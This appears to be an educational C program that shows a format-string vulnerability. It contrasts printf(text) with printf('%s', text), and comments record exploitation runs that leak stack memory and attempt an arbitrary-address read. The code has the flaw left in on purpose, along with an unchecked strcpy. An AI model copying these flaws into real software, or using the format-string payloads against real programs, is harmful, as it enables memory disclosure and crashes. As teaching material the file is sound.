#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char text[1024];
    static int test_val = -72;
    
    if(argc < 2) {
        printf("Usage: %s <text to print>\n", argv[0]);
        exit(0);
    }
    strcpy(text, argv[1]);
    
    printf("The right way to print user-controlled input:\n");
    printf("%s", text);
    
    printf("\nThe wrong way to print user-controlled input:\n");
    printf(text);
    
    printf("\n");
    
    // Debug output
    printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);
    
    exit(0);
}

/* ./fmt_vuln testing
The right way to print user-controlled input:
testing
The wrong way to print user-controlled input:
testing
[*] test_val @ 0xe2dd2050 = -72 0xffffffb8 */

/* ./fmt_vuln $(perl -e 'print "%08x."x40')
The right way to print user-controlled input:
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
The wrong way to print user-controlled input:
2c5552a0.00000000.6ea00d53.0000002f.6ea950c0.66df8548.00000007.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.6e918100.00000000.6eadc000.00000001.00000000.fffffff8.6eb2d220.6eb2d220.
[*] test_val @ 0x2ac05050 = -72 0xffffffb8 */

/* ./fmt_vuln AAAA%08x.%08x.%08x.%08x
The right way to print user-controlled input:
AAAA%08x.%08x.%08x.%08x
The wrong way to print user-controlled input:
AAAAb235d2a0.00000000.b89d0d53.0000002f
[*] test_val @ 0xb09e2050 = -72 0xffffffb8 */

/* └─$ ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s
The right way to print user-controlled input:
����%08x.%08x.%08x.%s
The wrong way to print user-controlled input:
zsh: segmentation fault  ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s */